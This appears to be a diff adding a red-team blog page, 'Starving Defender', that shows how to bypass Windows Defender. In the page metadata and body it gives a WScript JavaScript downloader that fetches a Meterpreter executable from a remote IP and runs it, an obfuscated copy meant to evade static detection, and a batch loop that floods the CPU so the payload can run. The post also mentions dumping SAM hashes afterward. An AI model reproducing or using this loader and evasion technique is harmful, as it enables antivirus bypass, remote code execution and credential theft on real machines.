@@ -1,0 +1,1632 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- `site.alt_lang` can specify a language different from the UI -->
+<html lang="en" data-mode="dark">
+  <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta
+    name="viewport"
+    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
+  ><!-- Setup Open Graph image -->
+
+  
+
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="JS Launcher This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors. To download a Meterpreter payload to the disk, we will use cscript.exe by creating a downloader.js file and double-clicking it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var url = &quot;http://10.8.8.8/met.exe&quot; var Object = WScript.CreateObject(&#39;MSXML2.XMLHTTP&#39;); Object.Open(&#39;GET&#39;, url, false); Object.Send(); if (Object.Status == 200) { var Stream = WScript.CreateObject(&#39;ADODB.Stream&#39;); Stream.Open(); Stream.Type = 1; Stream.Write(Object.ResponseBody); Stream.Position = 0; Stream.SaveToFile(&quot;met.exe&quot;, 2); Stream.Close(); } var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;met.exe&quot;); Both the JS script and the downloaded Meterpreter payload are detected statically before execution. The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/. The resulting script will look like this: 1 var _0x17d249=_0x1fcc;(function(_0x8d99f4,_0x5b012c){var _0x2cbcff=_0x1fcc,_0x176630=_0x8d99f4();while(!![]){try{var _0x516bb3=-parseInt(_0x2cbcff(0x1f5))/0x1+-parseInt(_0x2cbcff(0x1ec))/0x2+-parseInt(_0x2cbcff(0x1e5))/0x3*(parseInt(_0x2cbcff(0x1f2))/0x4)+parseInt(_0x2cbcff(0x1e7))/0x5+-parseInt(_0x2cbcff(0x1e6))/0x6*(-parseInt(_0x2cbcff(0x1f3))/0x7)+parseInt(_0x2cbcff(0x1ef))/0x8+-parseInt(_0x2cbcff(0x1ea))/0x9*(-parseInt(_0x2cbcff(0x1f1))/0xa);if(_0x516bb3===_0x5b012c)break;else _0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}catch(_0x444b68){_0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}}}(_0x4958,0x52d5f));var url=_0x17d249(0x1f8),Object=WScript[_0x17d249(0x1e4)](&#39;MSXML2.XMLHTTP&#39;);Object[&#39;Open&#39;](_0x17d249(0x1f6),url,![]),Object[&#39;Send&#39;]();if(Object[_0x17d249(0x1e8)]==0xc8){var Stream=WScript[&#39;CreateObject&#39;](_0x17d249(0x1ee));Stream[_0x17d249(0x1f0)](),Stream[_0x17d249(0x1e9)]=0x1,Stream[_0x17d249(0x1f4)](Object[_0x17d249(0x1f9)]),Stream[_0x17d249(0x1eb)]=0x0,Stream[_0x17d249(0x1f7)](&#39;met.exe&#39;,0x2),Stream[&#39;Close&#39;]();}var r=new ActiveXObject(_0x17d249(0x1fa))[_0x17d249(0x1ed)](&#39;met.exe&#39;);function _0x1fcc(_0x5aab95,_0x3af232){var _0x495812=_0x4958();return _0x1fcc=function(_0x1fcc18,_0xbf485){_0x1fcc18=_0x1fcc18-0x1e4;var _0xf5897c=_0x495812[_0x1fcc18];return _0xf5897c;},_0x1fcc(_0x5aab95,_0x3af232);}function _0x4958(){var _0x88af5=[&#39;174024sBDVKk&#39;,&#39;6aCgHFV&#39;,&#39;2711895TrvrLm&#39;,&#39;Status&#39;,&#39;Type&#39;,&#39;9307413HbmAyM&#39;,&#39;Position&#39;,&#39;792432hvPFro&#39;,&#39;Run&#39;,&#39;ADODB.Stream&#39;,&#39;470216MBGiiE&#39;,&#39;Open&#39;,&#39;10fGQDlo&#39;,&#39;36dgRipP&#39;,&#39;779387TmqUOV&#39;,&#39;Write&#39;,&#39;489071HUhQcm&#39;,&#39;GET&#39;,&#39;SaveToFile&#39;,&#39;http://10.8.8.8/met.exe&#39;,&#39;ResponseBody&#39;,&#39;WScript.Shell&#39;,&#39;CreateObject&#39;];_0x4958=function(){return _0x88af5;};return _0x4958();} Save it on the desktop as obf.js and attempt to execute it. Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security. Overloading the CPU To successfully execute Meterpreter with this technique, we need to spam multiple cscript.exe processes running our obf.js script, which will exhaust the CPU due to Defender’s MsMpEng.exe process. This time, we will create a separate launcher.bat script that spawns multiple instances of our malicious JS payload execution via a for loop. 1 2 3 4 @echo off for /l %%i in (1,1,500) do ( cscript //nologo obf.js ) We can execute this batch script multiple times and wait a few seconds. Your browser does not support the video tag. After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations." />
+<meta property="og:description" content="JS Launcher This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors. To download a Meterpreter payload to the disk, we will use cscript.exe by creating a downloader.js file and double-clicking it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var url = &quot;http://10.8.8.8/met.exe&quot; var Object = WScript.CreateObject(&#39;MSXML2.XMLHTTP&#39;); Object.Open(&#39;GET&#39;, url, false); Object.Send(); if (Object.Status == 200) { var Stream = WScript.CreateObject(&#39;ADODB.Stream&#39;); Stream.Open(); Stream.Type = 1; Stream.Write(Object.ResponseBody); Stream.Position = 0; Stream.SaveToFile(&quot;met.exe&quot;, 2); Stream.Close(); } var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;met.exe&quot;); Both the JS script and the downloaded Meterpreter payload are detected statically before execution. The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/. The resulting script will look like this: 1 var _0x17d249=_0x1fcc;(function(_0x8d99f4,_0x5b012c){var _0x2cbcff=_0x1fcc,_0x176630=_0x8d99f4();while(!![]){try{var _0x516bb3=-parseInt(_0x2cbcff(0x1f5))/0x1+-parseInt(_0x2cbcff(0x1ec))/0x2+-parseInt(_0x2cbcff(0x1e5))/0x3*(parseInt(_0x2cbcff(0x1f2))/0x4)+parseInt(_0x2cbcff(0x1e7))/0x5+-parseInt(_0x2cbcff(0x1e6))/0x6*(-parseInt(_0x2cbcff(0x1f3))/0x7)+parseInt(_0x2cbcff(0x1ef))/0x8+-parseInt(_0x2cbcff(0x1ea))/0x9*(-parseInt(_0x2cbcff(0x1f1))/0xa);if(_0x516bb3===_0x5b012c)break;else _0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}catch(_0x444b68){_0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}}}(_0x4958,0x52d5f));var url=_0x17d249(0x1f8),Object=WScript[_0x17d249(0x1e4)](&#39;MSXML2.XMLHTTP&#39;);Object[&#39;Open&#39;](_0x17d249(0x1f6),url,![]),Object[&#39;Send&#39;]();if(Object[_0x17d249(0x1e8)]==0xc8){var Stream=WScript[&#39;CreateObject&#39;](_0x17d249(0x1ee));Stream[_0x17d249(0x1f0)](),Stream[_0x17d249(0x1e9)]=0x1,Stream[_0x17d249(0x1f4)](Object[_0x17d249(0x1f9)]),Stream[_0x17d249(0x1eb)]=0x0,Stream[_0x17d249(0x1f7)](&#39;met.exe&#39;,0x2),Stream[&#39;Close&#39;]();}var r=new ActiveXObject(_0x17d249(0x1fa))[_0x17d249(0x1ed)](&#39;met.exe&#39;);function _0x1fcc(_0x5aab95,_0x3af232){var _0x495812=_0x4958();return _0x1fcc=function(_0x1fcc18,_0xbf485){_0x1fcc18=_0x1fcc18-0x1e4;var _0xf5897c=_0x495812[_0x1fcc18];return _0xf5897c;},_0x1fcc(_0x5aab95,_0x3af232);}function _0x4958(){var _0x88af5=[&#39;174024sBDVKk&#39;,&#39;6aCgHFV&#39;,&#39;2711895TrvrLm&#39;,&#39;Status&#39;,&#39;Type&#39;,&#39;9307413HbmAyM&#39;,&#39;Position&#39;,&#39;792432hvPFro&#39;,&#39;Run&#39;,&#39;ADODB.Stream&#39;,&#39;470216MBGiiE&#39;,&#39;Open&#39;,&#39;10fGQDlo&#39;,&#39;36dgRipP&#39;,&#39;779387TmqUOV&#39;,&#39;Write&#39;,&#39;489071HUhQcm&#39;,&#39;GET&#39;,&#39;SaveToFile&#39;,&#39;http://10.8.8.8/met.exe&#39;,&#39;ResponseBody&#39;,&#39;WScript.Shell&#39;,&#39;CreateObject&#39;];_0x4958=function(){return _0x88af5;};return _0x4958();} Save it on the desktop as obf.js and attempt to execute it. Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security. Overloading the CPU To successfully execute Meterpreter with this technique, we need to spam multiple cscript.exe processes running our obf.js script, which will exhaust the CPU due to Defender’s MsMpEng.exe process. This time, we will create a separate launcher.bat script that spawns multiple instances of our malicious JS payload execution via a for loop. 1 2 3 4 @echo off for /l %%i in (1,1,500) do ( cscript //nologo obf.js ) We can execute this batch script multiple times and wait a few seconds. Your browser does not support the video tag. After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations." />
+<link rel="canonical" href="http://0.0.0.0:4000/posts/starving-defender/" />
+<meta property="og:url" content="http://0.0.0.0:4000/posts/starving-defender/" />
+<meta property="og:site_name" content="innxrmxst" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-12T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe" />
+<meta name="twitter:site" content="@innxrmxst" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-12T00:00:00+02:00","datePublished":"2025-07-12T00:00:00+02:00","description":"JS Launcher This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors. To download a Meterpreter payload to the disk, we will use cscript.exe by creating a downloader.js file and double-clicking it. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var url = &quot;http://10.8.8.8/met.exe&quot; var Object = WScript.CreateObject(&#39;MSXML2.XMLHTTP&#39;); Object.Open(&#39;GET&#39;, url, false); Object.Send(); if (Object.Status == 200) { var Stream = WScript.CreateObject(&#39;ADODB.Stream&#39;); Stream.Open(); Stream.Type = 1; Stream.Write(Object.ResponseBody); Stream.Position = 0; Stream.SaveToFile(&quot;met.exe&quot;, 2); Stream.Close(); } var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;met.exe&quot;); Both the JS script and the downloaded Meterpreter payload are detected statically before execution. The first problem can be solved by using a public JS obfuscator, such as https://obfuscator.io/. The resulting script will look like this: 1 var _0x17d249=_0x1fcc;(function(_0x8d99f4,_0x5b012c){var _0x2cbcff=_0x1fcc,_0x176630=_0x8d99f4();while(!![]){try{var _0x516bb3=-parseInt(_0x2cbcff(0x1f5))/0x1+-parseInt(_0x2cbcff(0x1ec))/0x2+-parseInt(_0x2cbcff(0x1e5))/0x3*(parseInt(_0x2cbcff(0x1f2))/0x4)+parseInt(_0x2cbcff(0x1e7))/0x5+-parseInt(_0x2cbcff(0x1e6))/0x6*(-parseInt(_0x2cbcff(0x1f3))/0x7)+parseInt(_0x2cbcff(0x1ef))/0x8+-parseInt(_0x2cbcff(0x1ea))/0x9*(-parseInt(_0x2cbcff(0x1f1))/0xa);if(_0x516bb3===_0x5b012c)break;else _0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}catch(_0x444b68){_0x176630[&#39;push&#39;](_0x176630[&#39;shift&#39;]());}}}(_0x4958,0x52d5f));var url=_0x17d249(0x1f8),Object=WScript[_0x17d249(0x1e4)](&#39;MSXML2.XMLHTTP&#39;);Object[&#39;Open&#39;](_0x17d249(0x1f6),url,![]),Object[&#39;Send&#39;]();if(Object[_0x17d249(0x1e8)]==0xc8){var Stream=WScript[&#39;CreateObject&#39;](_0x17d249(0x1ee));Stream[_0x17d249(0x1f0)](),Stream[_0x17d249(0x1e9)]=0x1,Stream[_0x17d249(0x1f4)](Object[_0x17d249(0x1f9)]),Stream[_0x17d249(0x1eb)]=0x0,Stream[_0x17d249(0x1f7)](&#39;met.exe&#39;,0x2),Stream[&#39;Close&#39;]();}var r=new ActiveXObject(_0x17d249(0x1fa))[_0x17d249(0x1ed)](&#39;met.exe&#39;);function _0x1fcc(_0x5aab95,_0x3af232){var _0x495812=_0x4958();return _0x1fcc=function(_0x1fcc18,_0xbf485){_0x1fcc18=_0x1fcc18-0x1e4;var _0xf5897c=_0x495812[_0x1fcc18];return _0xf5897c;},_0x1fcc(_0x5aab95,_0x3af232);}function _0x4958(){var _0x88af5=[&#39;174024sBDVKk&#39;,&#39;6aCgHFV&#39;,&#39;2711895TrvrLm&#39;,&#39;Status&#39;,&#39;Type&#39;,&#39;9307413HbmAyM&#39;,&#39;Position&#39;,&#39;792432hvPFro&#39;,&#39;Run&#39;,&#39;ADODB.Stream&#39;,&#39;470216MBGiiE&#39;,&#39;Open&#39;,&#39;10fGQDlo&#39;,&#39;36dgRipP&#39;,&#39;779387TmqUOV&#39;,&#39;Write&#39;,&#39;489071HUhQcm&#39;,&#39;GET&#39;,&#39;SaveToFile&#39;,&#39;http://10.8.8.8/met.exe&#39;,&#39;ResponseBody&#39;,&#39;WScript.Shell&#39;,&#39;CreateObject&#39;];_0x4958=function(){return _0x88af5;};return _0x4958();} Save it on the desktop as obf.js and attempt to execute it. Once again, the downloaded Meterpreter payload is detected, but this time, the JS script (obf.js) is not removed by Windows Security. Overloading the CPU To successfully execute Meterpreter with this technique, we need to spam multiple cscript.exe processes running our obf.js script, which will exhaust the CPU due to Defender’s MsMpEng.exe process. This time, we will create a separate launcher.bat script that spawns multiple instances of our malicious JS payload execution via a for loop. 1 2 3 4 @echo off for /l %%i in (1,1,500) do ( cscript //nologo obf.js ) We can execute this batch script multiple times and wait a few seconds. Your browser does not support the video tag. After some time, the Meterpreter session might terminate, but as demonstrated in the video, there is still sufficient time to perform migration, dump hashes from the SAM database, and carry out additional operations.","headline":"Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/starving-defender/"},"url":"http://0.0.0.0:4000/posts/starving-defender/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  <title>Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe | innxrmxst
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+<link rel="icon" type="image/png" href="/assets/img/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/svg+xml" href="/assets/img/favicons/favicon.svg">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+
+  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">
+
+
+
+  <!-- Resource Hints -->
+  
+    
+      
+        <link rel="preconnect" href="https://fonts.googleapis.com" >
+      
+        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      
+        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
+      
+    
+      
+        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      
+        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+      
+    
+  
+
+  <!-- Bootstrap -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css">
+  
+
+  <!-- Theme style -->
+  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">
+
+  <!-- Web Font -->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css">
+
+  <!-- 3rd-party Dependencies -->
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.36.4/dist/tocbot.min.css">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
+  
+
+  
+    <!-- Image Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
+  
+
+  <!-- Scripts -->
+
+  <script src="/assets/js/dist/theme.min.js"></script>
+
+  <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.18/dayjs.min.js,npm/dayjs@1.11.18/locale/en.js,npm/dayjs@1.11.18/plugin/relativeTime.js,npm/dayjs@1.11.18/plugin/localizedFormat.js,npm/tocbot@4.36.4/dist/tocbot.min.js"></script>
+
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+  
+
+  <!-- A placeholder to allow defining custom metadata -->
+
+</head>
+
+
+  <body>
+    <!-- The Side Bar -->
+
+<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
+  <header class="profile-wrapper">
+    <a href="/" id="avatar" class="rounded-circle"><img src="/commons/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>
+
+    <a class="site-title d-block" href="/">innxrmxst</a>
+    <p class="site-subtitle fst-italic mb-0">Red Team Operator</p>
+  </header>
+  <!-- .profile-wrapper -->
+
+  <nav class="flex-column flex-grow-1 w-100 ps-0">
+    <ul class="nav">
+      <!-- home -->
+      <li class="nav-item">
+        <a href="/" class="nav-link">
+          <i class="fa-fw fas fa-home"></i>
+          <span>HOME</span>
+        </a>
+      </li>
+      <!-- the real tabs -->
+      
+        <li class="nav-item">
+          <a href="/categories/" class="nav-link">
+            <i class="fa-fw fas fa-stream"></i>
+            
+
+            <span>CATEGORIES</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/tags/" class="nav-link">
+            <i class="fa-fw fas fa-tags"></i>
+            
+
+            <span>TAGS</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/archives/" class="nav-link">
+            <i class="fa-fw fas fa-archive"></i>
+            
+
+            <span>ARCHIVES</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+        <li class="nav-item">
+          <a href="/about/" class="nav-link">
+            <i class="fa-fw fas fa-info-circle"></i>
+            
+
+            <span>ABOUT</span>
+          </a>
+        </li>
+        <!-- .nav-item -->
+      
+    </ul>
+  </nav>
+
+  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
+    
+
+    
+
+      
+        <a
+          href="https://github.com/innxrmxst"
+          aria-label="github"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-github"></i>
+        </a>
+      
+    
+
+      
+        <a
+          href="https://twitter.com/innxrmxst"
+          aria-label="twitter"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fa-brands fa-x-twitter"></i>
+        </a>
+      
+    
+
+      
+        <a
+          href="javascript:location.href = 'mailto:' + ['innxrmxst','gmail.com'].join('@')"
+          aria-label="email"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-envelope"></i>
+        </a>
+      
+    
+          
+        
+
+      
+        <a
+          href="/feed.xml"
+          aria-label="rss"
+          
+
+          
+
+          
+
+          
+        >
+          <i class="fas fa-rss"></i>
+        </a>
+      
+    
+          
+      
+
+      
+        <a
+          href="https://www.linkedin.com/in/maksymh/"
+          aria-label="linkedin"
+          
+
+          
+            target="_blank"
+            
+          
+
+          
+
+          
+            rel="noopener noreferrer"
+          
+        >
+          <i class="fab fa-linkedin"></i>
+        </a>
+      
+    
+  </div>
+  <!-- .sidebar-bottom -->
+</aside>
+<!-- #sidebar -->
+
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div class="container d-flex flex-column px-xxl-5">
+        <!-- The Top Bar -->
+
+<header id="topbar-wrapper" class="flex-shrink-0" aria-label="Top Bar">
+  <div
+    id="topbar"
+    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
+  >
+    <nav id="breadcrumb" aria-label="Breadcrumb">
+      
+
+      
+        
+          
+            <span>
+              <a href="/">Home</a>
+            </span>
+
+          
+        
+          
+        
+          
+            
+              <span>Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe</span>
+            
+
+          
+        
+      
+    </nav>
+    <!-- endof #breadcrumb -->
+
+    <button type="button" id="sidebar-trigger" class="btn btn-link" aria-label="Sidebar">
+      <i class="fas fa-bars fa-fw"></i>
+    </button>
+
+    <div id="topbar-title">
+      Post
+    </div>
+
+    <button type="button" id="search-trigger" class="btn btn-link" aria-label="Search">
+      <i class="fas fa-search fa-fw"></i>
+    </button>
+
+    <search id="search" class="align-items-center ms-3 ms-lg-0">
+      <i class="fas fa-search fa-fw"></i>
+      <input
+        class="form-control"
+        id="search-input"
+        type="search"
+        aria-label="search"
+        autocomplete="off"
+        placeholder="Search..."
+      >
+    </search>
+    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
+  </div>
+</header>
+
+
+        <div class="row flex-grow-1">
+          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              <!-- Refactor the HTML structure -->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Change the icon of checkbox -->
+
+
+
+<!-- Handle images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+      
+
+      
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+    
+
+    
+
+    
+      
+    
+
+    <!-- lazy-load images -->
+    
+
+    
+      <!-- make sure the `<img>` is wrapped by `<a>` -->
+      
+
+      
+        <!-- create the image wrapper -->
+        
+
+        
+        
+      
+    
+
+    <!-- combine -->
+    
+  
+
+  
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+    
+
+    
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- return -->
+
+
+
+
+
+
+
+
+
+
+<article class="px-1" data-toc="true">
+  <header>
+    <h1 data-toc-skip>Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe</h1>
+    
+
+    <div class="post-meta text-muted">
+      <!-- published date -->
+      <span>
+        Posted
+        <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1752271200"
+  data-df="ll"
+  
+    data-bs-toggle="tooltip" data-bs-placement="bottom"
+  
+>
+  Jul 12, 2025
+</time>
+
+      </span>
+
+      <!-- lastmod date -->
+      
+
+      
+
+      <div class="d-flex justify-content-between">
+        <!-- author(s) -->
+        <span>
+          
+
+          By
+
+          <em>
+            
+              <a href="https://x.com/innxrmxst">innxrmxst</a>
+            
+          </em>
+        </span>
+
+        <div>
+          <!-- pageviews -->
+          
+
+          <!-- read time -->
+          <!-- Calculate the post's reading time, and display the word count in tooltip -->
+
+
+
+<!-- words per minute -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span
+  class="readtime"
+  data-bs-toggle="tooltip"
+  data-bs-placement="bottom"
+  title="325 words"
+>
+  <em>1 min</em> read</span>
+
+        </div>
+      </div>
+    </div>
+  </header>
+
+  
+    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
+      <span class="label text-truncate">Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe</span>
+      <button type="button" class="toc-trigger btn me-1">
+        <i class="fa-solid fa-list-ul fa-fw"></i>
+      </button>
+    </div>
+
+    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
+      <span class="label ps-2 pe-1">Contents</span>
+      <i class="fa-solid fa-angle-right fa-fw"></i>
+    </button>
+
+    <dialog id="toc-popup" class="p-0">
+      <div class="header d-flex flex-row align-items-center justify-content-between">
+        <div class="label text-truncate py-2 ms-4">Starving Defender – Bypass AV by flooding CPU via MsMpEng.exe</div>
+        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
+          <i class="fas fa-close"></i>
+        </button>
+      </div>
+      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
+    </dialog>
+  
+
+  <div class="content">
+    <h2 id="js-launcher"><span class="me-2">JS Launcher</span><a href="#js-launcher" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>This is a quick, dirty, and very loud method of bypassing Windows Defender. Note that the Meterpreter payload will touch the disk in this scenario. I wanted to demonstrate an absurdly easy way of walking through Defender’s doors.</p>
+
+<p>To download a Meterpreter payload to the disk, we will use <code class="language-plaintext highlighter-rouge">cscript.exe</code> by creating a <code class="language-plaintext highlighter-rouge">downloader.js</code> file and double-clicking it.</p>
+
+<div class="language-js highlighter-rouge"><div class="code-header">
+        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://10.8.8.8/met.exe</span><span class="dl">"</span>
+<span class="kd">var</span> <span class="nb">Object</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nc">CreateObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">MSXML2.XMLHTTP</span><span class="dl">'</span><span class="p">);</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nc">Open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nc">Send</span><span class="p">();</span>
+<span class="k">if </span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">Status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">Stream</span> <span class="o">=</span> <span class="nx">WScript</span><span class="p">.</span><span class="nc">CreateObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ADODB.Stream</span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Open</span><span class="p">();</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nx">Type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Write</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nx">Position</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nc">SaveToFile</span><span class="p">(</span><span class="dl">"</span><span class="s2">met.exe</span><span class="dl">"</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+    <span class="nx">Stream</span><span class="p">.</span><span class="nc">Close</span><span class="p">();</span>
+<span class="p">}</span>
